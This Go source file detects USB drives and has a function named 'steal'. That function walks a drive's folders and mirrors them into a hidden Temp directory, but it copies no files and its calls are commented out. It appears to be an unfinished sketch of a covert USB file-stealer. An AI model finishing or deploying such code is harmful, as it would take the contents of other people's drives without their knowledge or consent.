package main

import (
	"fmt"
	"os"
	//"runtime"
	"log"
	"time"
	usbdrivedetector "github.com/deepakjois/gousbdrivedetector"
)

func steal(usbDir string) {
	var dstDir = os.Getenv("LOCALAPPDATA") + "\\Temp\\" + "test_flash"
	os.Mkdir(dstDir, os.FileMode(0522))

	entries, err := os.ReadDir(usbDir)
	if err != nil {
		log.Fatal(err)
	}

	for _, e := range entries {
		var thisDir = usbDir + "\\" + e.Name()
		var fStaty, err = os.Stat(thisDir)
		if err != nil {
			panic(err)
		}

		if os.FileInfo.IsDir(fStaty) {
			if e.Name() != "System Volume Information" { 
				os.Mkdir(dstDir + "\\" + e.Name() ,os.FileMode(0522))
				steal(thisDir)
			}
		} else {
			fmt.Println("File:", thisDir)
		}
	}
}

func detectUsb() {

	if drives, err := usbdrivedetector.Detect(); err == nil {
		fmt.Printf("%d USB Devices Found\n", len(drives))
		if len(drives) > 0 {
			for _, d := range drives {
				fmt.Println(d)
				//steal(d)
			}
		}

	} else {
		log.Println(err)
	}

}


func main() {

	for {
		//detectUsb()
		fmt.Println()
		fmt.Print()
		time.Sleep(time.Second * 2)
	}

}
